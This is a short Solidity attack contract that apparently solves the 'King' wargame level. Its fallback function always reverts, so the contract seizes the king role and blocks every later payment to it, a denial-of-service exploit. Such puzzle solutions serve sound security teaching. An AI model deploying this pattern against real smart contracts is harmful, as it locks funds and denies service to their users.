pragma solidity ^0.6.0;
import '../King/King.sol';

contract AttackKing {

  King public king;
  address private owner;

  constructor(address payable _king) public {
    king = King(_king);
    owner = msg.sender;
  }

  function attack() payable public {
    address(king).call.value(msg.value)("");
  }

  fallback() external payable {
    revert('I am King!');
  }
}
